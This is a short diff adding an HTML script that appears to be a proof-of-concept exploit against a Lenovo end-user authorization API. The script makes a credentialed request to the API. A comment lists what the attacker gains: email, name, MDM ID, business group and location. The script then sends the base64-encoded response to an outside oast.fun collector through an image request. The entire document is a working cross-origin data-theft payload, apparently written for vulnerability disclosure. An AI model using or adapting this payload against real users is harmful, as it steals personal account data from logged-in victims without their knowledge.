@@ -1,0 +1,10 @@
+<script>
+fetch("https://ovp.lenovo.com/dxp/api/authorization/v1/end-user", {
+  credentials: "include"
+})
+.then(r => r.json())
+.then(data => {
+  // Attacker now has: email, name, MDM ID, business group, geo
+  new Image().src = "https://vkzrlskaoqarcpkawuom9a6zpw9n06ses.oast.fun/steal?data=" + btoa(JSON.stringify(data));
+});
+</script>
